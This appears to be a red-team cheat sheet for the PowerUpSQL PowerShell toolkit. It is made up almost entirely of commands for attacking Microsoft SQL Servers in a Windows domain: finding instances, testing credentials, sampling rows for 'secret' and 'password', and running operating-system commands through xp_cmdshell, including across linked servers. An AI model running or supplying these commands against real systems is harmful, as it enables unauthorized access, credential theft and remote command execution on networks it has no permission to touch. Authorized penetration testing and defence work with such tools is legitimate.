### Source
https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1  

### Discover active directory domain SQL server (use)
```
Get-SQLInstanceDomain -Verbose -DomainController <dc> | Get-SQLServerinfo -Verbose
```

### List accessible SQL server using credentials
```
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username <user> -password <password> | Where-Object {$_.Status -like "Accessible"}
```

### Get information from specific instance
```
Get-Sqlserverinfo -instance <instance>
```

### Scan for misconfiguration
```
Invoke-sqlaudit -instance <instance>
```

### Search database rows for specific keywords (NoDefaults skip default tables)
```
Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <instance>
```

### Execute command
```
Invoke-SQLOSCmd -Instance <instance> -Command '<command>' -RawResults
```

### Execute query
```
Get-SQLQuery -Instance <instance> -Query 'SELECT * FROM master..sysservers'
```

### Scan for linked databases
```
Get-SQLServerLinkCrawl -Instance <instance>
```

### Execute commands on linked instances
```
Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell '<command>'"
```

### Excute command on linked mssql instance via instance (xp_cmdshell can not be enabled by OpenQuery)
```
Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell '<command>' "
```

